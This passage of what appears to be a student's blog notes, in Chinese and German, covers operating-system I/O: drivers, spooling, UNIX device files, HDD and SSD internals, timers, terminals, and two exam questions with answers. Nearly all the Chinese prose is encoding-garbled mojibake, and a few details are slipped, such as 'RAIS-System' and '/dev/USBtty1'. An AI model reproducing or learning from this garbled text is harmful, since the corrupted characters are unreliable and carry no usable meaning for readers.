GerÃ¤t auszutauschenï¼‰ åŒæ ·ï¼Œé©±åŠ¨ä¹Ÿå¯èƒ½å­˜åœ¨å­ç»“æ„ï¼ˆUnterstrukturï¼‰ï¼Œæ¯”å¦‚è¯´USBã€‚ é©±åŠ¨çš„ä¸»è¦ä»»åŠ¡ï¼š å®šä¹‰è®¾å¤‡å¹¶å‘æ“ä½œç³»ç»Ÿæ³¨å†Œï¼Œå¹¶æ¿€æ´»è®¾å¤‡ã€‚ï¼ˆdefiniert das GerÃ¤t gegenÃ¼ber dem BS, aktiviert das GerÃ¤tï¼‰ åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶åˆå§‹åŒ–æ§åˆ¶å™¨å’Œè®¾å¤‡ã€‚ï¼ˆinitialisiert den Controller und das GerÃ¤t beim Systemstartï¼‰ è½¬æ¢I/O è¯·æ±‚ï¼Œä½¿å…¶å˜ä¸ºè®¾å¤‡å¯ç†è§£çš„æŒ‡ä»¤ã€‚ï¼ˆwandelt E/A-Anforderungen in gerÃ¤tespezifische Befehle umï¼‰ å“åº”ï¼ˆæ¥è‡ªè®¾å¤‡æˆ–æ§åˆ¶å™¨çš„ï¼‰ç¡¬ä»¶ä¿¡å·ã€‚ï¼ˆantwortet auf Hardwaresignale des GerÃ¤ts bzw. des Controllersï¼‰ï¼ˆæ¯”å¦‚è¯´ Interrupt handlingï¼‰ æŠ¥å‘Šè®¾å¤‡å’Œæ§åˆ¶å™¨çš„é”™è¯¯ï¼ˆé”™è¯¯æ£€æµ‹å’Œæ—¥å¿—è®°å½•ï¼‰ã€‚ï¼ˆmeldet GerÃ¤te- und Controller-Fehlerï¼‰ ä¼ è¾“è®¾å¤‡ä¸æ“ä½œç³»ç»Ÿä¹‹é—´çš„æ•°æ®å’ŒçŠ¶æ€ä¿¡æ¯ã€‚ï¼ˆÃ¼bertrÃ¤gt Daten und Zustandsinformation vom/zum GerÃ¤tï¼‰ ç¼“å†²è¾“å…¥/è¾“å‡ºæ•°æ®ï¼Œä¼˜åŒ–æ•°æ®ä¼ è¾“æ€§èƒ½ã€‚ï¼ˆæä¾›Bufferï¼‰ï¼ˆpuffert Daten bei Ein- und Ausgabeï¼‰ è®¾å¤‡é©±åŠ¨æ˜¯å¦‚ä½•ä¸è®¾å¤‡æ§åˆ¶å™¨åä½œçš„ï¼Ÿ é©±åŠ¨ç¨‹åºå‘é€å‘½ä»¤åˆ°è®¾å¤‡æ§åˆ¶å™¨ï¼Œå¹¶åœ¨ç­‰å¾…æœŸé—´é˜»å¡è‡ªèº«ï¼ˆé˜²æ­¢ CPU è¿‡åº¦è½®è¯¢ï¼‰ã€‚ï¼ˆTreiber schickt Kommandos zum Controller und blockiert sichï¼‰ æ§åˆ¶å™¨å¤„ç†æ•°æ®å¹¶åœ¨ä¼ è¾“å®Œæˆåå‘é€ä¿¡å·ï¼ˆé€šçŸ¥æ•°æ®äº¤æ¢å·²å®Œæˆï¼‰ã€‚ï¼ˆController signalisiert das Ende des Datenaustauschesï¼‰ ä¸­æ–­å¤„ç†ç¨‹åºï¼ˆInterrupt-Handlerï¼‰è§£é™¤é©±åŠ¨çš„é˜»å¡çŠ¶æ€ï¼Œä¾‹å¦‚é€šè¿‡ä¿¡å·é‡ï¼ˆSemaphoreï¼‰ è®©è¿›ç¨‹æ¢å¤è¿è¡Œã€‚ï¼ˆDer Interrupt-Handler entsperrt den Treiber (z.B. Semaphore)ï¼‰ é©±åŠ¨ç¨‹åºå¤„ç†æ”¶åˆ°çš„æ•°æ®æˆ–ç»§ç»­å‘é€æ–°æ•°æ®ã€‚ï¼ˆTreiber verarbeitet empfangene Daten bzw. schickt weitere Datenï¼‰ è®¾å¤‡æ— å…³çš„è½¯ä»¶ï¼ˆGerÃ¤te-unabhÃ¤ngige Softwareï¼‰è®¾å¤‡æ— å…³çš„è½¯ä»¶çš„ç›®çš„æ˜¯ç®€åŒ–é©±åŠ¨ç¨‹åºçš„ç¼–ç¨‹ï¼ˆVereinfachte Treiber-Programmierungï¼‰ï¼Œå¹¶ä¾¿äºé›†æˆæ–°çš„é©±åŠ¨ç¨‹åºè½¯ä»¶ï¼ˆEinfache Einbindung neuer Treiber-Softwareï¼‰ã€‚ è®¾å¤‡æ— å…³è½¯ä»¶çš„ä¸»è¦ä»»åŠ¡ï¼š åœ¨è®¾å¤‡é©±åŠ¨ç¨‹åºå’Œæ“ä½œç³»ç»Ÿä¹‹é—´å»ºç«‹æ ‡å‡†æ¥å£ã€‚ï¼ˆBereitstellung einer einheitlichen Schnittstelle zwischen GerÃ¤tetreibern und dem Rest des Betriebssystemsï¼‰ ç¼“å†² å¦‚æœç¼“å†²ä¸ç”±é©±åŠ¨ç®¡ç†ï¼Œåˆ™ç”±è®¾å¤‡æ— å…³çš„è½¯ä»¶è´Ÿè´£ã€‚ é”™è¯¯å¤„ç†ï¼ˆFehlerbehandlungï¼‰ é™¤äº†é©±åŠ¨ç¨‹åºæœ¬èº«çš„é”™è¯¯å¤„ç†å¤–ï¼Œè¿˜æä¾›é¢å¤–çš„é”™è¯¯ç®¡ç†æœºåˆ¶ã€‚ è®¾ç½®è®¾å¤‡æ— å…³çš„å‚æ•°ï¼ˆFestlegung gerÃ¤teunabhÃ¤ngiger Parameterï¼‰ æ¯”å¦‚è¯´å—è®¾å¤‡ï¼ˆBlockgerÃ¤tï¼‰ä½¿ç”¨çš„å—å¤§å°ï¼ˆBlockgrÃ¶ÃŸeï¼‰ ç”¨æˆ·çº§è½¯ä»¶ï¼ˆUser-Level-Softwareï¼‰ç³»ç»Ÿåº“ï¼ˆSystembibliothekï¼‰é€šå¸¸ä¼šç›´æ¥ç»™ç”¨æˆ·æä¾›E/Açš„ç¼–ç¨‹æ¥å£ã€‚ æ¯”å¦‚è¯´ï¼š open()ï¼š æ‰“å¼€è®¾å¤‡çš„é€»è¾‘é€šé“ï¼Œè¿”å›ä¸€ä¸ª æ–‡ä»¶æè¿°ç¬¦ï¼ˆDescriptor æˆ– Handleï¼‰ï¼Œä¾›åç»­æ“ä½œä½¿ç”¨ã€‚ read()ï¼š ä»è®¾å¤‡è¯»å–æ•°æ®ï¼Œè¿”å›æŒ‡å®šæ•°é‡çš„å­—èŠ‚æµï¼ˆBytestreamï¼‰ã€‚ close()ï¼š å…³é—­å…ˆå‰æ‰“å¼€çš„é€šé“ï¼Œé‡Šæ”¾ç›¸å…³çš„ç³»ç»Ÿèµ„æºã€‚ write()ï¼š å‘è®¾å¤‡å†™å…¥æ•°æ®ï¼Œå‘é€æŒ‡å®šæ•°é‡çš„å­—èŠ‚åˆ°è®¾å¤‡ã€‚ ioctl()ï¼š æ”¹å˜è®¾å¤‡çš„æ“ä½œæ¨¡å¼ï¼Œæ¯”å¦‚è°ƒæ•´ä¸²è¡Œç«¯å£çš„ä¼ è¾“é€Ÿç‡æˆ–è€…æ˜¯ä¿®æ”¹è®¾å¤‡çš„æ§åˆ¶å‚æ•° é™¤äº†è¿™äº›æ ‡å‡†åº“å‡½æ•°ï¼Œè¿˜æœ‰ï¼š å‡è„±æœºï¼ˆSpoolingï¼‰ç”±äºåœ¨ç°å®ç”Ÿæ´»ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šæœ‰å¤šä¸ªè¿›ç¨‹åŒæ—¶æäº¤I/Oè¯·æ±‚ï¼Œæ¯”å¦‚è¯´ç”¨ä¸€å°æ‰“å°æœºæ‰“å°å¤šä»½æ–‡ä»¶ã€‚è¿™ä¸ªæ—¶å€™å°±éœ€è¦æƒ³åŠæ³•åè°ƒèµ„æºçš„ä½¿ç”¨ï¼Œé¿å…å‡ºç°å†²çªã€‚ ä»€ä¹ˆæ˜¯ Spoolingï¼Ÿ Spoolingï¼ˆSimultaneous Peripheral Operations Onlineï¼ŒåŒæ­¥å¤–è®¾æ“ä½œï¼‰ æ˜¯ä¸€ç§ç”¨äºç®¡ç†ç‹¬å ï¼ˆï¼‰exklusiv nutzbar)è®¾å¤‡ï¼ˆå¦‚æ‰“å°æœºï¼‰è®¿é—®çš„ç¼“å†²æœºåˆ¶ã€‚ åœ¨è¿™ä¸ªæœºåˆ¶ä¸‹ï¼Œè¿›ç¨‹ä¸ä¼šç›´æ¥è®¿é—®è®¾å¤‡ï¼Œè€Œæ˜¯å°†ä»»åŠ¡äº¤ç»™ Spooler Daemonï¼ˆå‡è„±æœºå®ˆæŠ¤è¿›ç¨‹ï¼‰ å¤„ç†ã€‚åªæœ‰ Spooler Daemon ä¼šç›´æ¥ä¸è®¾å¤‡é©±åŠ¨ç¨‹åºäº¤äº’ï¼Œç¡®ä¿è®¾å¤‡é¡ºåºæ‰§è¡Œä»»åŠ¡ã€‚ç”¨æˆ·è¿›ç¨‹çš„ä»»åŠ¡å…ˆå­˜å…¥ Spooling ç›®å½•ï¼ˆç¼“å†²åŒºï¼‰ï¼Œç„¶åæŒ‰é¡ºåºæ‰§è¡Œã€‚ UNIX/Linuxé‡Œçš„è®¾å¤‡ç®¡ç†åœ¨UNIX/Linuxé‡Œï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡æ–‡ä»¶ç³»ç»Ÿè®¿é—® I/O è®¾å¤‡ï¼ˆå› ä¸ºâ€œEverything is a fileâ€ï¼‰ï¼š åœ¨è®¿é—®è®¾å¤‡å‰ï¼Œå¿…é¡»å…ˆæ‰“å¼€å®ƒ openã€‚ ä¸åŒè®¾å¤‡æ”¯æŒé¢å¤–çš„æ–‡ä»¶ç³»ç»Ÿæ“ä½œï¼Œå¦‚è¯»å†™ã€çŠ¶æ€æŸ¥è¯¢ç­‰ã€‚ è®¾å¤‡ç®¡ç†ä½äº /dev ç›®å½•ï¼Œæ‰€æœ‰è®¾å¤‡æ–‡ä»¶éƒ½å­˜æ”¾åœ¨è¿™é‡Œã€‚ è®¾å¤‡çŠ¶æ€æŸ¥è¯¢å’Œé…ç½®å¯èƒ½ä½äº /proc ç›®å½•ã€‚ è®¾å¤‡æ–‡ä»¶åç§°æŒ‡ç¤ºè®¾å¤‡ç±»å‹ï¼Œæ¯”å¦‚è¯´ï¼š /dev/tty0ï¼šç‰©ç†ä¸²è¡Œæ¥å£ï¼ˆç»ˆç«¯ï¼‰ã€‚ /dev/USBtty1ï¼šæŠ½è±¡ä¸²è¡Œæ¥å£ï¼ˆUSB ä¸²å£è®¾å¤‡ï¼‰ã€‚ /dev/sd0ï¼šç¡¬ç›˜è®¾å¤‡ï¼ˆsd ä»£è¡¨ SCSI ç£ç›˜ï¼‰ã€‚ /dev/nullï¼šä¼ªè®¾å¤‡ï¼Œå†™å…¥çš„æ•°æ®ä¼šè¢«ä¸¢å¼ƒã€‚ /dev/zeroï¼šä¼ªè®¾å¤‡ï¼Œè¯»å–æ—¶è¿”å›æ— é™çš„ 0 å­—èŠ‚ã€‚ Spooling ä»»åŠ¡å­˜å‚¨åœ¨ /var/spool ç›®å½•ä¸‹ï¼Œå…¶ä¸­ lpqï¼šæ‰“å°ä»»åŠ¡é˜Ÿåˆ—ï¼ˆæ‰“å°æœº Spoolingï¼‰ã€‚ mqueueï¼šé‚®ä»¶æœåŠ¡å™¨çš„å‘é€é˜Ÿåˆ—ï¼ˆé‚®ä»¶ Spoolingï¼‰ã€‚ newsï¼šæ–°é—»ç³»ç»Ÿæ¶ˆæ¯é˜Ÿåˆ—ï¼ˆæ–°é—» Spoolingï¼‰ã€‚ cronï¼šå®šæ—¶ä»»åŠ¡æ‰§è¡Œé˜Ÿåˆ—ï¼ˆä»»åŠ¡è°ƒåº¦ Spoolingï¼‰ã€‚ è€Œè®¾å¤‡çš„çœŸæ­£æ ‡è¯†å­˜å‚¨åœ¨ i-Node ä¸­ã€‚i-Nodeä¼šåŒ…å«ï¼š ä¸»è®¾å¤‡å·ï¼ˆMajor Device Numberï¼‰ï¼šæ ‡è¯†è®¾å¤‡é©±åŠ¨ç¨‹åºï¼ˆå†³å®šè®¾å¤‡çš„é©±åŠ¨ï¼‰ã€‚ æ¬¡è®¾å¤‡å·ï¼ˆMinor Device Numberï¼‰ï¼šè¦è®¿é—®çš„å…·ä½“è®¾å¤‡ã€‚ è®¾å¤‡ä¾‹å­ï¼ˆæœºæ¢°ï¼‰ç¡¬ç›˜ï¼ˆFestplattenï¼ŒHDDï¼‰æœºæ¢°ç¡¬ç›˜å±äºBlock-GerÃ¤tï¼Œæœ‰ç€ä»¥ä¸‹æ„é€ ï¼š åŒå¿ƒåœ†æŸ±ï¼ˆKonzentrische Zylinderï¼‰ å †å çš„ç£ç›˜ç›˜ç‰‡ï¼ˆPlatten, k å±‚ï¼‰ï¼Œæ¯å¼ ç›˜ç‰‡çš„ä¸¤é¢éƒ½å¯ä»¥è¯»å†™ï¼ˆ2k é¢ï¼‰ã€‚ æ¯å¼ ç›˜ç‰‡ä¸Šæœ‰å¤šä¸ªç£é“ï¼ˆTracksï¼‰ï¼Œç£é“çš„ç¼–å·å–å†³äº åœ†æŸ±ã€ç›˜ç‰‡å’Œé¢ï¼ˆTrack = f(Zylinder, Platte, Seite)ï¼‰ã€‚ æ¯ä¸ªç£é“ç”±å¤šä¸ªæ‰‡åŒºï¼ˆSektorenï¼‰ç»„æˆï¼Œæ¯ä¸ªæ‰‡åŒºå¤§å°ä¸º 512 å­—èŠ‚ã€‚ä¸è¿‡é è¿‘ç£ç›˜ä¸­å¿ƒçš„åŒºåŸŸå¯èƒ½æœ‰æ›´å°‘çš„æ‰‡åŒºï¼ˆç”±äºåœ†å‘¨è¾ƒå°ï¼‰ã€‚ æœºæ¢°è¯»å†™ç£å¤´ï¼ˆSchreib-/LesekÃ¶pfeï¼‰ï¼Œæ¯ä¸ªç›˜ç‰‡æœ‰ä¸¤ä¸ªè¯»å†™ç£å¤´ï¼ˆä¸Šä¸‹å„ä¸€ä¸ªï¼‰ï¼Œæ€»æ•°ä¸º 2kã€‚ æ„é€ å›¾ç¤ºï¼š æ—©æœŸä¼šç”¨åˆ°3ä¸ªå‚æ•°æ¥ç¡®å®šéœ€è¦è¯»å†™çš„å…·ä½“ä½ç½®ï¼š x Zylindernummerï¼ŒRadiusï¼šç¡®å®šæ˜¯å“ªä¸€ä¸ªç¯ï¼› y Kopfnummerï¼ŒHÃ¶heï¼šç¡®å®šæ˜¯å“ªä¸€å¼ ç›˜ç‰‡çš„å“ªä¸€é¢ï¼› z Sektornummer pro Winkelï¼šç¡®å®šæ˜¯å“ªä¸ªæ‰‡é¢ï¼› ç”±äºæ—©æœŸ BIOS å’Œæ–‡ä»¶ç³»ç»Ÿçš„è®¾è®¡çš„é™åˆ¶ï¼Œåªèƒ½è®¿é—®æœ‰é™çš„åŒºåŸŸã€‚ æ‰€ä»¥ç°åœ¨ä¸€èˆ¬éƒ½ä½¿ç”¨çº¿æ€§é€»è¾‘åœ°å€ï¼ˆlineare Adressierung logischer BlÃ¶ckeï¼‰ï¼Œå³ç»™æ¯ä¸ªSectorç¼–å·ï¼ˆ0ï¼Œ1ï¼Œ2ï¼Œ3ï¼Œâ€¦ï¼‰ã€‚ ä¸€ä¸ªSectoré‡Œä¼šåŒ…å«ä»¥ä¸‹ä¿¡æ¯ï¼š å‰å¯¼ä¿¡æ¯ï¼ˆPrÃ¤ambelï¼‰ï¼š åŒ…å«åŒæ­¥ä½ã€ç£é“å·å’Œæ‰‡åŒºå· æ•°æ®ï¼ˆDatenï¼‰ï¼š é€šå¸¸ä¸º512å­—èŠ‚ é”™è¯¯æ ¡æ­£ç ï¼ˆECCï¼‰ï¼š Error Correcting Code Cylinder Skew: The offset distance from the start of the last track of the previous cylinder so that the head has time to seek from cylinder to cylinder and be at the start of the first track of the new cylinder. Head Skew: The offset distance from the start of the previous track so that the head has time to switch from top of platter to bottom of platter and be at the start of the new track. æ§åˆ¶å™¨é€šå¸¸ä¸€æ¬¡è¯»å–æ•´ä¸ªç£é“ï¼Œè¿™ä¼šéœ€è¦è¶³å¤Ÿçš„ç¼“å­˜æ¥å­˜å‚¨æ•°æ®ã€‚ä½†å‡å¦‚æ²¡æœ‰è¶³å¤Ÿçš„ç¼“å­˜ï¼Œåˆ™ä¼šé‡‡ç”¨äº¤é”™çš„æ ¼å¼ï¼ˆ Formatierung mit Interleavingï¼‰ï¼šæ‰‡åŒºä¸ä¼šæŒ‰é¡ºåºæ’åˆ—çš„ï¼š1, 2, 3, 4, 5, 6, â€¦, 15ï¼Œè€Œæ˜¯äº¤é”™æ’åˆ—çš„ï¼š1, 4, 7, 10, 13, 2, 5, 8, 11, 14, 3, 6, 9, 12, 15ã€‚è¿™æ ·å­å¯ä»¥ç¡®ä¿è¯»å–æŸä¸ªæ‰‡åŒº N ï¼Œå°†æ•°æ®ä¼ è¾“åˆ°ä¸»å­˜åï¼Œæ‰‡åŒº N+1 ä¼šåˆšå¥½ç§»åŠ¨åˆ°è¯»å†™å¤´ä¸‹æ–¹ï¼Œä¸éœ€è¦å†å¤šç­‰ä¸€åœˆã€‚ï¼ˆå› ä¸ºç£ç›˜å¥½åƒæ˜¯ä¼šä¸€ç›´è½¬çš„ï¼‰ ä¸ºäº†é¿å…ç£ç›˜æŸåå½±å“ç¡¬ç›˜åŠŸèƒ½ï¼Œä¼šä½¿ç”¨RAIS-Systemã€‚ï¼ˆè¯¦ç»†å†…å®¹è§æ•°æ®åº“çš„ç¬”è®°ï¼‰ è¯»å†™ç£å¤´æ‰¾åˆ°æ‰€éœ€Sectorçš„ç­–ç•¥åˆ†3ç§ï¼š FCFS Shortest Seek First (SSF) Elevator algorithm (Fahrstuhl-Algorithmus) å›ºæ€ç¡¬ç›˜ï¼ˆSSDï¼‰SSDçš„å…¨ç§°ä¸ºSolid State Drivesï¼Œä¸»è¦åŸºäº (NAND) é—ªå­˜ã€‚ SSDçš„ä¸€äº›ç‰¹ç‚¹ï¼š æ— æœºæ¢°éƒ¨ä»¶ï¼ˆKeine beweglichen Teileï¼‰ æ‰€ä»¥ä¸ä¼šæœ‰æœºæ¢°ç£¨æŸåŠå…¶å¯¼è‡´çš„æ•…éšœï¼Œæ›´è€æŒ¯åŠ¨ã€å†²å‡»ç­‰ï¼Œè®¿é—®é€Ÿåº¦æ›´å¿«ã€‚ ä»ç„¶å¯èƒ½å‡ºç°æ•…éšœï¼ˆFehlfunktionen auch hier mÃ¶glichï¼‰ï¼Œæ¯”å¦‚ åå—ï¼Œå­˜å‚¨èŠ¯ç‰‡æ•…éšœï¼ˆBad blocks, Fehler in Speicherchipsï¼‰ åå¤è¯»å–å¯èƒ½å½±å“ç›¸é‚»å­˜å‚¨å•å…ƒ æ•…éšœå¯èƒ½å¯¼è‡´æ•´ä¸ª SSD æ— æ³•è¯»å– æ•°æ®æ¢å¤æ›´åŠ å¤æ‚ é—ªå­˜å†™å…¥æ¬¡æ•°æœ‰é™ï¼ˆFlash-Speicher nur begrenzt oft schreibbarï¼‰ è¯»å–æ¯”å†™å…¥å¿«ï¼Œé¡ºåºï¼ˆsequentiellï¼‰å†™å…¥æ¯”éšæœºå†™å…¥å¿« SSDçš„åŸºæœ¬å·¥ä½œåŸç†SSDçš„åˆå§‹çŠ¶æ€æ˜¯ï¼š 111111111 11111111 11111111 ... å†™å…¥çš„è¯ä¼šå°†1æ”¹æˆ0ï¼š 101000111 01000010 01010011 ... ä½†å¦‚æœæƒ³ä¿®æ”¹çš„è¯ï¼Œä¸èƒ½åªæ˜¯ä¿®æ”¹ä¸€ä½ï¼Œè€Œæ˜¯éœ€è¦å°†è¿™ä¸€æ•´å—é‡ç½®ç„¶åå†å†™å…¥ã€‚ å†™å…¥çš„å¤§å°æœ€ä½ä¸º4KBï¼Œåˆ é™¤çš„å¤§å°æœ€ä½ä¸º256KBï¼Œæ‰€ä»¥ä¼šå¯¼è‡´æ‰€è°“çš„å†™å…¥æ”¾å¤§ï¼ˆWrite Amplificationï¼‰çš„é—®é¢˜ã€‚ è§£å†³æ–¹å¼ï¼šè¿™éƒ¨åˆ†æˆ‘æ²¡çœ‹æ‡‚ï¼Œç­‰çœ‹æ‡‚äº†å†å†™ã€‚ æ—¶é’Ÿï¼ˆUhr,ï¼‰æ—¶é’Ÿä¼šæŒç»­æ€§è®¡æ—¶ã€‚ ç¡¬ä»¶æ—¶é’Ÿï¼ˆHardware-Uhr (Chip)ï¼‰çš„æ„æˆï¼š Quarz als Taktgeberï¼š çŸ³è‹±æ™¶ä½“â€ä½œä¸ºæ—¶é’Ÿä¿¡å·æºï¼Œç”¨æ¥äº§ç”Ÿç¨³å®šçš„æŒ¯è¡ä¿¡å·ï¼ˆå‘¨æœŸæ€§ç”µä¿¡å·ï¼‰ä½œä¸ºâ€œèŠ‚æ‹â€ã€‚ è®¡æ•°å™¨ï¼ˆZÃ¤hlerï¼‰ï¼š æ¯ä¸ªæ—¶é’ŸèŠ‚æ‹åˆ°æ¥æ—¶ï¼Œè®¡æ•°å™¨çš„å€¼ä¼šå‡1ï¼ˆdekrementiertï¼‰ï¼› å½“è®¡æ•°å™¨å€¼å‡åˆ°0æ—¶ï¼Œå°±ä¼šè§¦å‘ä¸€ä¸ªä¸­æ–­ï¼ˆInterruptï¼‰ã€‚ Register zum (wiederholten) Setzen des ZÃ¤hlers auf einen Startwertï¼š å¯ä»¥é€šè¿‡è½¯ä»¶æ¥æ§åˆ¶Interruptçš„é¢‘ç‡ã€‚ æ—¶é’Ÿ/å®šæ—¶å™¨çš„ä»»åŠ¡ï¼š ç®¡ç†æ—¶é—´å’Œæ—¥æœŸï¼ˆTageszeit und Datum verwaltenï¼‰ ä¸­æ–­å’Œåˆ‡æ¢è¿›ç¨‹ï¼ˆè°ƒåº¦ï¼‰ï¼ˆProzesse unterbrechen und umschalten (Scheduling)ï¼‰ æµ‹é‡æŸä¸ªè¿›ç¨‹çš„è®¡ç®—æ—¶é—´æ¶ˆè€—ï¼ˆRechenzeitverbrauch eines Prozesses messenï¼‰ å‘åº”ç”¨ç¨‹åºæä¾›å®šæ—¶å™¨åŠŸèƒ½ï¼ˆ Zeitschaltuhren den Anwendungen zur VerfÃ¼gung stellenï¼‰ åŠŸèƒ½ç›‘æ§ï¼ˆçœ‹é—¨ç‹—å®šæ—¶å™¨ï¼‰ï¼ˆFunktionsfÃ¤higkeitsÃ¼berwachung (watchdog timer)ï¼‰ æ€§èƒ½åˆ†æã€ç›‘æ§ã€ç»Ÿè®¡ï¼ˆProfiling, Monitoring, Statistikï¼‰ å¯ä»¥ç”¨é“¾è¡¨çš„æ•°æ®ç»“æ„æ¥ç®¡ç†å®šæ—¶äº‹ä»¶ï¼š æ‰€æœ‰æ—¶é—´å‡ä¸ºç›¸å¯¹æ—¶é—´ï¼ˆrelativen Zeitenï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯ä¸ªèŠ‚ç‚¹çš„å€¼ä»£è¡¨ç›¸å¯¹äºå‰ä¸€ä¸ªäº‹ä»¶çš„å»¶è¿Ÿï¼ˆä»¥ tick ä¸ºå•ä½ï¼‰ã€‚ å®šæ—¶å™¨ï¼ˆTimerï¼‰Timerï¼ˆå®šæ—¶å™¨ï¼‰ç¡®å®é€šå¸¸åˆ†ä¸ºä¸¤ç§ç±»å‹ï¼š ç¡¬ä»¶å®šæ—¶å™¨ï¼ˆHardware Timerï¼‰ï¼š ç³»ç»Ÿé€šå¸¸æœ‰ç¬¬äºŒä¸ªå¯ç¼–ç¨‹å®šæ—¶å™¨ã€‚å®ƒåœ¨åˆ°æ—¶é—´çš„æ—¶å€™ä¼šè§¦å‘Interruptã€‚ä½†Interruptçš„ä»£ä»·æœ‰ç‚¹é«˜ï¼Œå› ä¸ºä¼šå¼•å‘ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œå¹¶ä¸”å¯èƒ½ä¼šå¹²æ‰°ç¨‹åºæ­£å¸¸è¿è¡Œã€‚ è½¯ä»¶å®šæ—¶å™¨ï¼ˆSoftware Timerï¼‰ï¼š è¿™ä¸ªçš„æƒ³æ³•æ˜¯åªåœ¨ç³»ç»Ÿå¤„äºå†…æ ¸æ€æ—¶æ£€æŸ¥å®šæ—¶å™¨çŠ¶æ€ï¼ˆnur dann aktiv werden, wenn System im Kernel-Mode istï¼‰ï¼Œè¿™æ ·ä¸€æ¥å°±ä¸éœ€è¦é¢å¤–çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚åœ¨ä»å†…æ ¸æ¨¡å¼åˆ‡æ¢åˆ°ç”¨æˆ·æ¨¡å¼ä¹‹å‰ï¼Œæ“ä½œç³»ç»Ÿè¯»å–å®æ—¶æ—¶é’Ÿå¹¶æ£€æŸ¥æ˜¯å¦æœ‰è½¯ä»¶å®šæ—¶å™¨å·²ç»è¶…æ—¶ï¼Œå¦‚æœ‰éœ€è¦ï¼Œå¤„ç†ç›¸åº”çš„äº‹ä»¶ã€‚ å®ƒçš„ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯å»¶è¿Ÿï¼Œä¸è¿‡å¤§éƒ¨åˆ†æƒ…å†µä¸‹éƒ½æ˜¯å¯ä»¥æ¥å—çš„ã€‚ ç»ˆç«¯ï¼ˆTerminalsï¼‰ç»ˆç«¯æ˜¯å¦‚ä½•é€šè¿‡é©±åŠ¨ç¨‹åºå°†ç”¨æˆ·è¾“å…¥/è¾“å‡ºè½¬åŒ–ä¸ºç³»ç»Ÿèƒ½å¤Ÿç†è§£çš„æ•°æ®æµçš„ï¼š ä¸Šå±‚ï¼šæä¾›ä¸€ä¸ªç»Ÿä¸€æ¥å£ç»™æ“ä½œç³»ç»Ÿçš„è¾“å…¥/è¾“å‡ºå­ç³»ç»Ÿï¼ˆEinheitliche Schnittstelle zum E/A-Subsystem des BSï¼‰ ä¸­å±‚ï¼šè§£æè¾“å…¥å’Œæ„é€ è¾“å‡ºå†…å®¹ï¼ˆBearbeitungsmodul fÃ¼r Ein- und Ausgabenï¼‰ ä¸‹å±‚ï¼šä¸ä¸åŒçš„ç‰©ç†ç¡¬ä»¶è®¾å¤‡ç›´æ¥å¯¹åº”ï¼ˆAbbildung verschiedene physische GerÃ¤teï¼‰ï¼Œæ¯”å¦‚é¼ æ ‡ã€æ˜¾å¡ã€‚ ç³»ç»Ÿä¸­çš„ terminal æ˜¯ä¸€ä¸ªåº•å±‚çš„å­—ç¬¦è®¾å¤‡æœºåˆ¶ï¼Œç®¡ç†è¾“å…¥è¾“å‡ºæµã€è¿›ç¨‹æ§åˆ¶å’Œé©±åŠ¨ä¹‹é—´çš„åä½œã€‚è€Œæˆ‘ä»¬å¹³å¸¸ç”¨çš„cmdåªæ˜¯æ˜¯ terminalçš„ä¸€ç§è¡¨ç°å½¢å¼ã€‚ ä¾‹é¢˜ä¾‹é¢˜1Welche Implikation hat der heutige Wechsel von HDDs auf SSDs fÃ¼r Betriebssysteme? Freie BlÃ¶cke sollten explizit markiert werden Niedrigere Random-Access Latency SSDs haben variable BlockgrÃ¶ÃŸen Exzessives Swapping strapaziert Lebensdauer Erlaubt direkten Zugriff durch Userspace Kein DMA notwendig ç­”æ¡ˆï¼š1ï¼Œ2ï¼Œ4ã€‚ è§£é‡Šï¼š HDDæ˜¯è¦†ç›–å†™å…¥ï¼Œæ‰€ä»¥åªè¦æ“ä½œç³»ç»Ÿè‡ªå·±çŸ¥é“å“ªäº›å—æ˜¯ç©ºçš„å°±å¤Ÿäº†ã€‚ä½†SSDæ˜¯æ“¦é™¤å†™å…¥ï¼Œæ‰€ä»¥éœ€è¦æ“ä½œç³»ç»Ÿæ˜ç¡®å‘Šè¯‰SSDå“ªäº›å—æ˜¯ç©ºçš„å®ƒæ‰ä¼šå»æ“¦é™¤ã€‚ SSD æ²¡æœ‰æœºæ¢°è‡‚ï¼Œä¸éœ€è¦å¯»é“ï¼Œæ‰€ä»¥éšæœºè®¿é—®ï¼ˆRandom Accessï¼‰éå¸¸å¿«ï¼Œå³éšæœºè®¿é—®å»¶è¿Ÿæ›´ä½ï¼ˆNiedrigere Random-Access Latencyï¼‰ SSDæœ‰æ˜ç¡®çš„å†™å…¥æ¬¡æ•°é™åˆ¶ï¼Œè€ŒHDDåªæ˜¯ä¼šè€åŒ–è€Œå·² æ‰€æœ‰ç£ç›˜éƒ½éœ€è¦DMA ä¾‹é¢˜2 Welche Komponenten werden nicht aktiv, wenn ein Nutzer lokal an seinem Rechner einen Command in ein Terminal im Cooked Mode tippt (ohne Enter zu drÃ¼cken)? Kernel TLB Tastatur-Treiber Terminal-Emulator Shell-Prozess Systembus ç­”æ¡ˆï¼š5. è§£é‡Šï¼š1ï¼Œ2ï¼Œ3ï¼Œ6åœ¨ç³»ç»Ÿå¤„ç†è¾“å…¥çš„æ—¶å€™éƒ½ä¼šaktivã€‚4æ˜¯ç»ˆç«¯çš„ç¨‹åºï¼Œæç¤ºä½ è¾“å…¥å‘½ä»¤çš„ã€‚","categories":[{"name":"TUM info è¯¾ç¨‹ç¬”è®°","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS æ“ä½œç³»ç»Ÿ","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/GBS-æ“ä½œç³»ç»Ÿ","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating 